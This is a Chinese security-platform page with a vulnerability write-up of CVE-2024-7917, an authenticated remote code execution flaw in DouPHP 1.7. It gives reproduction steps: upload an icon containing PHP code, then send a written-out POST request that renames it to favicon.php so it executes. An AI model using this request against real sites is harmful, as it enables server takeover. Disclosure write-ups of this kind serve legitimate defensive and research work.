
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="一个团队使用的贡献平台">
  <meta name="keywords" content="安全,团队,贡献">
  <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>【原创】（CVE-2024-7917）DouPHP 1.7 Release 20220822 远程代码执行漏洞 | 安全团队贡献平台</title>

  <link rel="icon" type="image/ico" href="/static/img/main.ico">

  <!-- Set render engine for 360 browser -->
  <meta name="renderer" content="webkit">

  <!-- No Baidu Siteapp-->
  <meta http-equiv="Cache-Control" content="no-siteapp"/>

  <!-- Add to homescreen for Chrome on Android -->
  <meta name="mobile-web-app-capable" content="yes">

  <!-- Add to homescreen for Safari on iOS -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="安全团队贡献平台"/>

  <!-- SEO: If your mobile URL is different from the desktop URL, add a canonical link to the desktop page https://developers.google.com/webmasters/smartphone-sites/feature-phones -->
  <!--
  <link rel="canonical" href="http://www.example.com/">
  -->
  <link rel="stylesheet" href="/static/normalize.css/normalize.min.css">
  <link rel="stylesheet" href="/static/amazeui-2.7.2/dist/css/amazeui.min.css">
  <link rel="stylesheet" href="/static/css/archive.css">
  
  
<link rel="stylesheet" href="/static/css/code.css">

</head>
<body>
<header class="am-topbar am-g am-g-collapse">
<div class="am-container" style="padding-left: 0">
  <div class="am-u-sm-centered">
  <h1 class="am-topbar-brand">
    <a href="#">安全团队贡献平台</a>
  </h1>

  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only" data-am-collapse="{target: '#doc-topbar-collapse'}">
      <span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span>
  </button>

  <div class="am-collapse am-topbar-collapse" id="doc-topbar-collapse">
    <ul class="am-nav am-nav-pills am-topbar-nav">
      <li ><a href="/">首页</a></li>
      <!--<li ><a href="/list/">所有信息</a></li>-->
	  <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          所有信息 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
            <li ><a href="/list/all/">所有情报</a></li>
			<li ><a href="/list/recommend/">推荐专区</a></li>
			<li ><a href="/list/wiki/">综合情报</a></li>
			<li ><a href="/list/userpost/">用户提交</a></li>
			<li ><a href="/list/school/">高校情报</a></li>
        </ul>
      </li>
      <li ><a href="/user/">排行榜</a></li>
      <li ><a href="/gift/">礼品中心</a></li>
	  <li ><a href="/search/">搜索</a></li>
      <li ><a href="/announcements/">公告</a></li>
	  <li ><a href="/ip/">IPwhois<sup>新功能</sup></a></li>
	  <li ><a href="/wooyun/" target="_blank">WooYun drops<sup>新功能</sup></a></li>
      <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          更多 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/edudata" target="_blank">edudata平台</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3629/" target="_blank">零组知识库-006应急响应目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3631/" target="_blank">零组知识库-007内网渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3632/" target="_blank">零组知识库-009安全技术目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3633/" target="_blank">零组知识库-010域渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3634/" target="_blank">零组知识库-011运维与二进制安全目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/xss" target="_blank">XSS平台</a></li>
            
          
            
                <li><a href="http://data.shikangsi.com/" target="_blank">edusrc数据分析</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/links/" target="_blank">友情链接</a></li>
            
          
            
          
            
          
            
                <li><a href="https://wiki.shikangsi.com/zone/" target="_blank">wiki社区</a></li>
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
        </ul>
      </li>
    </ul>
	
        
    <div class="am-topbar-right">
      <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/add/">提交贡献</a>
    </div>
	
	<div class="am-topbar-right">
        <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/login/">登录</a>
    </div>
	<div class="am-topbar-right">
        <a class="am-btn am-btn-secondary am-topbar-btn am-btn-sm" href="/register/">注册</a>
    </div>
	


  </div>
  </div>
</div>
</header>


<div class="am-container">
<div class="am-g">
  <div class="am-u-sm-centered am-u-sm-11">
      <article class="am-article">
          <div class="am-article-hd">
            <h1 class="am-article-title">【原创】（CVE-2024-7917）DouPHP 1.7 Release 20220822 远程代码执行漏洞</h1>
              <hr />
              <button type="button" class="am-btn am-btn-primary btn-copy" data-am-popover="{content: '已复制'}">分享</button>
              <h3>当前为私密分享，无需登录即可查看。</h3>
              <hr />
          </div>

          <table class="am-table am-table-bordered ">
              <tr>
                  <th>时间</th>
                  <th class="am-text-center am-hide-sm-down">作者</th>
				  <th width="8%" class="am-text-center am-hide-sm-down">可见性</th>
                  <th width="8%" class="am-text-center am-hide-sm-down">等级</th>
                  <th class="am-text-center am-hide-sm-down">Rank</th>
              </tr>
              <tr>
              <tr>
                  <td>2024-08-12 14:22:58</td>
                  <td class="am-text-center am-hide-sm-down"><a href="/profile/637/" class="am-link-muted">Hkey</a></td>
				  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-success">公开的</span></td>
                  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-warning">高危</span></td>
                  <td class="am-text-center am-hide-sm-down">3</td>
              </tr>
            </table>

          <div class="am-article-bd">
            <p class="">CVE-2024-7917<br>Created: 08/18/2024 10:37 AM<br>Changes: 08/18/2024 10:37 AM (55)<br>Submitter: Hkey@Wiki</p>
              <hr>
            <h1>漏洞描述</h1>
<blockquote>
<p>DouPHP是一个开源的PHP开发框架，广泛应用于快速开发Web应用。其设计目标是简单、快速、灵活、安全。</p>
</blockquote>
<p>DouPHP 1.7_Release_20220822版本中存在一个远程代码执行（RCE）漏洞。拥有管理员权限的攻击者可以通过该漏洞在服务器上执行任意命令。漏洞通过上传恶意文件、修改文件扩展名以及通过构造特定的数据包来执行PHP代码。</p>
<h1>漏洞复现</h1>
<p>1、 登录管理员后台。</p>
<p>2、 上传恶意文件</p>
<p><img alt="null" src="/media/images/2024/08/12/8449c8a3-7fa1-4968-8cb6-c49ec4d41a5c-z4wy94sz.png" /></p>
<p><img alt="null" src="/media/images/2024/08/12/722b0d55-5152-4e46-8afa-ae3158f766c0-yMVQ8qJu.png" /></p>
<p>3、 上传一个包含php代码的ico图标</p>
<p><img alt="null" src="/media/images/2024/08/12/8193f54e-2371-4f0e-b97d-96b226bc84a9-npHvH8Xp.png" /></p>
<p>上传成功:</p>
<p><img alt="null" src="/media/images/2024/08/12/1ba8de15-2cd7-493b-a020-bc2c174b518e-yynuDYfV.png" /></p>
<p>4、把上传的favicon.ico文件修改为favicon.php,从而执行php代码。</p>
<p><img alt="null" src="/media/images/2024/08/12/c71b679e-4025-4ec9-b3bc-4d51e8bc6c3b-MqTsGmEA.png" /></p>
<p><img alt="null" src="/media/images/2024/08/12/e6044073-cbac-4ab9-8c2c-cfe15eb30384-S43xmy1D.png" /></p>
<p><img alt="null" src="/media/images/2024/08/12/3161dbaf-4918-4c4a-bf75-aa7bb9284756-PV3dvLko.png" /></p>
<p>抓取数据包，进行修改文件名操作</p>
<p><img alt="null" src="/media/images/2024/08/12/3ab6622d-61bd-4d4b-b771-44a609f05afb-McymJelb.png" /></p>
<pre class="codehilite"><code>POST /cache/custom\_admin\_path.candel.php HTTP/1.1
Host: douphp:84
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: http://douphp:84
Connection: close
Referer: http://douphp:84/admin/tool.php?rec=custom\_admin\_path
Cookie: PHPSESSID=bl1s095coldq9mc4a2d9ivrgki
Upgrade-Insecure-Requests: 1
Priority: u=0, i

new\_path=favicon.php&old\_path=favicon.ico&ryjwoi=278144&root\_url=http%3A%2F%2Fdouphp%3A84%2F&submit=%E6%8F%90%E4%BA%A4
</code></pre>

<p><img alt="null" src="/media/images/2024/08/12/b5c2b172-4f85-4ccb-8704-45c827a69e3c-1Ym4fFYu.png" /></p>
<p>访问对应的恶意文件路径:http://{你的url地址}/favicon.php</p>
<p><img alt="null" src="/media/images/2024/08/12/f23217b3-4b0b-457f-981b-0241de3fd881-1wPJrGiO.png" /></p>
          </div>

          attachment/2024/08/d773107c-726b-4f24-a0b7-4aff6cf98e48-weAxeCnx.docx


      </article>

      <hr>
      <section class="am-panel am-panel-default">
          <div class="am-panel-bd am-text-sm">
            审核评价： 没有任何评价...
          </div>
        </section>

  </div>
</div>
</div>
<div class="main-footer" style="margin:5% 0 auto;text-align:center;">
    2014-2022 © 联系邮箱：<a href="mailto:admin@sg95.cn">admin@sg95.cn</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://beian.miit.gov.cn">鄂ICP备15020128号-4</a><br>
</div>


<!--<footer class="footer" id="footer">

</footer>
-->
<script src="/static/jquery-3.3.1/dist/jquery.min.js"></script>
<script src="/static/amazeui-2.7.2/dist/js/amazeui.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.newsTicker.min.js"></script>
<script type="text/javascript" src="/js/"></script>
<script>
    const input = document.getElementById('keyword');

    $(document).on('input keypress', function(event) {
    const value = input.value;
    console.log(value); // 获取并处理输入值
    if(event.keyCode==13){
        event.preventDefault();
        event.stopPropagation();
        var url=window.location.origin+'/search/'+value;
        console.log(url);
        window.location.href=url;
    }
});
$("#searchBtn").click(function(){
var url=window.location.origin+'/search/'+$("#keyword").val();
console.log(url);
window.location.href=url;
});
$("#ipwhois").click(function(){
var url=window.location.origin+'/ip/'+$("#ip").val();
console.log(url);
window.location.href=url;
});
</script>

<script src="/static/js/archive.js"></script>
<script src="/static/clipboardjs-2.0.10/clipboard.min.js"></script>
<script type="text/javascript">
function escape(txt) {
    return txt && txt.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function reply(id, touser) {
    $("#id_parent").val(id);
    touser = escape('回复 “ ' + touser + ' ”');
    touser = $('<div class="am-alert am-text-sm" id="my-alert" data-am-alert><button type="button" class="am-close">&times;</button><p>'+touser+'</p></div>')
    $('#reply-box').html(touser);
    $('#my-alert').on('closed.alert.amui', function() {
      $("#id_parent").val('');
    });
}
//修改超链接地址
$(document).ready(function(){
if($('.am-article-bd').html().indexOf('http:///article')!==-1){
$('a').each(function(){
var url=$(this).attr('href');
var localURL=window.location.origin;
url=url.replace("http://",localURL);
$(this).attr('href',url);
})
}
else{
console.log('该页面无需替换。');
}
});
</script>

</body>
</html>